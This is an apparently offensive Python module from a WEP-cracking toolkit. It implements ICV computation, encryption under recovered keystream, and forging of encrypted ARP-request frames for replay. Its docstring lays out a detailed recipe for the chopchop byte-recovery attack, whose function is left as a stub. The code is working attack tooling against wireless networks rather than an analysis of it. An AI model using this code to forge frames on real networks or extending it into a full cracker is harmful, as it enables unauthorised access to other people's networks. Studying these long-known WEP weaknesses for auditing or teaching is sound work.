"""Pure WEP crypto for fragmentation / chopchop (M5/M6).

EVERYTHING HERE IS OFFLINE-TESTABLE — no hardware. This is the trickiest
correctness in M5/M6, so it's built + unit-tested first (the playbook that made
RC4/PTW low-risk). The hardware-in-the-loop part (the oracle: recognizing the
AP's relayed frame) lives in fragmentation.py / chopchop.py.

WEP per-frame layout of the encrypted body (after the 24/26-byte MAC header):
    IV(3) | KeyID(1) | RC4( plaintext ++ ICV )      where ICV = CRC32(plaintext)
The MAC header is cleartext; only plaintext++ICV is RC4'd. Forging needs only
the *keystream* (the IV's RC4 output), never the key — the whole point of
frag/chopchop.

Status: icv / wep_encrypt / forge_arp_request are IMPLEMENTED + tested
(tests/engine/test_wep_crypto.py). chop_last_byte_and_fixup is still a stub —
the KoreK linear-ICV fix-up; do it next with heavy unit tests.
"""

from __future__ import annotations

import struct
import zlib

# LLC/SNAP + ARP-request plaintext prefix (everything up to the variable
# sender/target fields). WEP encrypts this; the bytes are well-known, which is
# what gives frag/chopchop their known-plaintext foothold.
_SNAP_ARP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
_ARP_HDR = bytes([0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])  # eth/ip, req


def icv(plaintext: bytes) -> bytes:
    """4-byte WEP ICV: CRC-32 of plaintext, little-endian. WEP's ICV is the
    standard IEEE CRC-32 (reflected, init/final 0xFFFFFFFF) — i.e. zlib.crc32."""
    return struct.pack("<I", zlib.crc32(plaintext) & 0xFFFFFFFF)


def wep_encrypt(keystream: bytes, plaintext: bytes) -> bytes:
    """Encrypt under a known keystream → the ciphertext *body* (what follows
    IV+KeyID on the wire): (plaintext ++ icv(plaintext)) XOR keystream.
    Needs len(keystream) >= len(plaintext) + 4."""
    blob = plaintext + icv(plaintext)
    if len(keystream) < len(blob):
        raise ValueError(
            f"keystream too short: need {len(blob)} bytes, have {len(keystream)}"
        )
    return bytes(b ^ k for b, k in zip(blob, keystream))


def forge_arp_request(
    keystream: bytes,
    *,
    sender_mac: bytes,
    sender_ip: bytes,
    target_ip: bytes,
) -> bytes:
    """Forge a broadcast ARP-request *encrypted body* from recovered keystream.

    Plaintext = LLC/SNAP ++ ARP-request (36 B), so needs >= 40 B of keystream.
    The caller (campaign) prepends the IV+KeyID this keystream belongs to and a
    ToDS MAC header, then hands it to WepArpReplay. target_mac is all-zero
    (unknown — it's a request)."""
    if len(sender_mac) != 6 or len(sender_ip) != 4 or len(target_ip) != 4:
        raise ValueError("sender_mac must be 6 bytes, IPs 4 bytes each")
    plaintext = (
        _SNAP_ARP + _ARP_HDR + sender_mac + sender_ip + b"\x00" * 6 + target_ip
    )
    return wep_encrypt(keystream, plaintext)


# The CRC32 residue: crc32(data ++ icv(data)) == this constant for ALL data
# (verified offline). A WEP frame's plaintext P = data++icv is valid iff
# crc32(P) == CRC32_RESIDUE. This is what lets ChopChop cancel the unknown ICV.
CRC32_RESIDUE = 0x2144DF1C


def chop_last_byte_and_fixup(body: bytes, plaintext_guess: int) -> bytes:
    """ChopChop core (STUB — M6): given an encrypted body whose ICV is valid,
    return a one-byte-shorter body whose ICV is ALSO valid IFF ``plaintext_guess``
    equals the true last plaintext byte (P[L-1]).

    WORKED-OUT RECIPE (the hard part — the unknown-ICV cancellation — is done;
    only the standard reverse-CRC routine remains). With:
      B    = body (len L),  S = keystream,  P = B^S (valid: crc32(P)==RESIDUE)
      g    = plaintext_guess (the last plaintext byte P[L-1])
    The result is ``B[:L-1]`` with its LAST 4 BYTES XORed by a 4-byte ``corr``:
      B' = bytearray(B[:L-1]);  B'[L-5:L-1] ^= corr

    Why this works (affine CRC + residue cancel the unknown ICV/keystream):
      P' = P[:L-1] ^ corr_padded   (corr_padded = 0^(L-5) ++ corr)
      valid(P')  ⟺  crc32(P') == RESIDUE
      crc32(P') = crc32(P[:L-1]) ^ crc32(corr_padded) ^ crc32(0^(L-1))   [affine]
      crc32(P[:L-1]) is computable from the KNOWN crc32(P)==RESIDUE and g, by
        reversing ONE crc32 step over byte g (register form: reg=crc^0xFFFFFFFF;
        reg(P)=RESIDUE^0xFFFFFFFF; reg(P[:L-1]) = reverse_step(reg(P), g)).
      ⇒ require:  crc32(corr_padded) = RESIDUE ^ crc32(P[:L-1]) ^ crc32(0^(L-1))
      Solve for the 4-byte ``corr`` with a standard reverse-CRC "patch" routine
        (find 4 trailing bytes that drive the CRC to a target) — see Stigge et
        al, "Reversing CRC". corr depends only on g + known quantities; the
        unknown ICV and keystream are gone.

    TODO next session: implement reverse_step + the 4-byte CRC patch (from a
    reference), then this. UNIT-TEST against the oracle: build a body from a
    known keystream + known plaintext, chop+fixup with the CORRECT last byte →
    result XOR keystream must have a valid ICV (crc32==RESIDUE); a WRONG guess
    must NOT. (The reverse-CRC patch is intricate bit-math — do not eyeball it,
    TDD it.)"""
    raise NotImplementedError("M6 — see recipe above; TDD the reverse-CRC patch")
